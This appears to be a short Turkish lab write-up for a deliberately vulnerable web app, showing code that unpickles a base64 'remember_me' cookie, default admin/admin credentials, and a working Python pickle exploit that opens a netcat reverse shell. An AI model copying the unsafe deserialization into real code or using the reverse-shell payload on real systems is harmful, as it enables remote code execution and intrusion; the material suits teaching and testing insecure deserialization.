# Zafiyetli Kod

```py
    b64 = request.cookies.get("remember_me")
    dump = pickle.loads(base64.b64decode(b64))
    session['username'] = dump.username
    session['loggedIn'] = True
```




# Açıklama

- Kullanıcı uygulamaya giriş yaptığı zaman ve remember me checkbox'sını işaretlediği zaman kullanıcıya bir tane cookie generate ediliyor.

- Kullanıcı isteği burp suite'de incelediği zaman cookienin base64 encoding olduğunu görecek. Zafiyeti sömürecek kodu generate ettiği zaman cookieyi değiştirip sistemde kod çalıştırabilecek.






## Credentials
- username = admin
- password = admin

- username = default
- password = default





# Zafiyetin Sömürülmesi
```py
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```
